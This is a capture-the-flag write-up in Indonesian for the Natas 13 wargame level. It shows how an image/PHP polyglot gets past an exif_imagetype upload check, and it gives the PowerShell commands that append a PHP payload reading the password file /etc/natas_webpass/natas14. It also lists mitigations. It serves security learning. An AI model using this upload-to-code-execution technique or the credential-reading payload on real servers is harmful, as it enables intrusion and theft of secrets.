
---

### `natas-13/README.md`

```markdown
# Natas 13 → Natas 14

## 🎯 Objective

Mendapatkan password untuk level Natas 14.

## 🔎 Initial Analysis

Level ini terlihat mirip dengan Natas 12 karena kembali menggunakan file upload.

Namun terdapat validasi tambahan:

```php
exif_imagetype($_FILES['uploadedfile']['tmp_name'])
```
Dari informasi yang didapat dari halaman web kita dapat melihat tulisan `For security reasons, we now only accept image files!`, server sekarang mencoba memastikan bahwa file yang di-upload merupakan image.

## 🧠 Vulnerability / Concept
Concept:
- File Upload Vulnerability
- Magic Bytes / File Signature
- MIME / Image Type Validation
- Polyglot File
- PHP Code Execution

## 🔬 Source / Page Analysis

Bagian penting:
```php
$ext = pathinfo($fn, PATHINFO_EXTENSION);
```
Kemudian:
```php
else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
    echo "File is too big";
}
```
Dan:
```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
    echo "File is not an image";
}
```

## Analisis

Terdapat tiga pemeriksaan penting:
1. Error upload
2. File size ≤ 1000 bytes
3. File dikenali sebagai image

Namun server masih menentukan ekstensi target berdasarkan:
```php
pathinfo($_POST["filename"], PATHINFO_EXTENSION)
```
Tidak terdapat validasi yang memastikan bahwa:
image → hanya boleh .jpg

## 🧪 Investigation

#### Percobaan 1 — File teks

filename = sesuatu.php
uploadedfile = text file

Hasil:
For security reasons, we now only accept image files!

File is not an image

#### Percobaan 2 — Image valid

Saya menggunakan image kecil dengan ukuran:
144 bytes

Image berhasil melewati pemeriksaan tipe file:
For security reasons, we now only accept image files!

The file upload/eu5cd5msye.jpg has been uploaded

#### Percobaan 3 — Image + PHP
Pertama saya ingin copy terlebih dahulu file image <1kb dengan menggunakan :
```powershell
Copy-Item .\foto.jpg .\exploit.php
```

Setelah itu saya mempertahankan data image yang valid dan menambahkan kode PHP:
```php
<?php echo "NATAS13-TEST"; ?>
```
dengan menggunakan powershell:
```powershell
[System.IO.File]::AppendAllText((Resolve-Path .\exploit.php), '<?php echo "NATAS13-TEST"; ?>')
```
File kemudian di-upload menggunakan:
filename = exploit.php

Hasil:
upload/si93n5ocfo.php

Ketika file dibuka:
........NATAS13-TEST

Hal tersebut membuktikan bahwa PHP berhasil dieksekusi.

#### Percobaan 4 — Image + PHP exploit

Karena sebelumnya kita sudah berhasil mengupload file .php yang berisi tulisan `NATAS13-TEST`, sekarang waktunya untuk mengupload file .php exploit untuk mendapatkan password level selanjutnya :
```powershell
[System.IO.File]::AppendAllText((Resolve-Path .\exploit.php), '<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>')
```

Ketika file dibuka :
....A0xXu2x9FW8rb8OSQ4e...........

## 💡 Exploitation

Konsep exploit:

                Uploaded File
                     │
          ┌──────────┴──────────┐
          ▼                     ▼
     Image signature          PHP code
          │                     │
          ▼                     ▼
 exif_imagetype()           PHP interpreter
      accepts                    executes
          │                     │
          └──────────┬──────────┘
                     ▼
             filename = .php
                     │
                     ▼
             upload/random.php

Setelah eksekusi PHP berhasil dibuktikan menggunakan payload sederhana, payload tersebut digunakan untuk membaca password level berikutnya.

## 🛡️ Mitigation

Validasi image saja tidak cukup jika file masih dapat dieksekusi sebagai server-side script.

Mitigasi yang lebih baik:
- Jangan menyimpan upload di web root.
- Gunakan allowlist extension.
- Validasi file menggunakan image parser yang aman.
- Re-encode image menggunakan image processing library.
- Generate filename secara server-side.
- Nonaktifkan script execution pada upload directory.
- Terapkan least privilege pada file permissions.

## 📚 Yang Saya Pelajari

- Extension dan file content adalah dua hal berbeda.
- exif_imagetype() menggunakan data file untuk mengenali tipe image.
- Magic bytes dapat digunakan untuk mengenali format file.
- Validasi file yang hanya memeriksa apakah file merupakan image belum tentu mencegah code execution.
- Sebuah file dapat memiliki karakteristik lebih dari satu format/data.
- File upload vulnerability dapat berkembang menjadi remote code execution.

